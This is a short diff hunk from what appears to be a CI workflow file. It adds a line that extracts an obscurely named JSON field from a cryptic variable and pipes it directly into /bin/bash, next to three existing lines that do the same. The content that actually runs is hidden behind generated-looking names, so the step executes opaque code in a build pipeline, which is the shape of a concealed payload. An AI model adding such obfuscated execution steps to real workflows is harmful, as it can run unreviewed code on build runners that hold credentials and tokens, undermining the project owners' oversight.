@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$o171" | jq -r .xhk23747 | /bin/bash
           echo $bi62 | jq -r .fm54777 | /bin/bash
           printf '%s' "$u9" | jq -r .mwx76575 | /bin/bash
+          echo $gwdk0 | jq -r .pmxpt2014 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
